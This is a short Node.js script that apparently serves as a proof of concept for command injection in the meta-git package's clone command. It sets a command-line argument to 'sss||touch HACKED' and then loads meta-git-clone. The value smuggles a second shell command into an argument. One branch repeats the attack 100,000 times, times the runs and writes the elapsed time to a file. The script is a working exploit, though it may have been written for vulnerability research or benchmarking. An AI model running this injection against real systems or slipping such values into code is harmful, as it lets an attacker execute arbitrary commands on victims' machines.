
    var arguments = process.argv;
    if (arguments.length == 3) {
        type = arguments[2];
        var time1 = process.hrtime.bigint();
        for (var i = 0; i < 100000; i++){
        try{
               process.argv[2] = 'sss||touch HACKED';
           require("./node_modules/meta-git/bin/meta-git-clone")
 } catch(e){}
        }      
        var time2 = process.hrtime.bigint();
        console.log(`${type}_time: ${time2-time1}`); 
        require("fs").writeFileSync(`${type}_time`, (time2-time1).toString()); 
    } else{
       process.argv[2] = 'sss||touch HACKED';
   require("./node_modules/meta-git/bin/meta-git-clone")

    }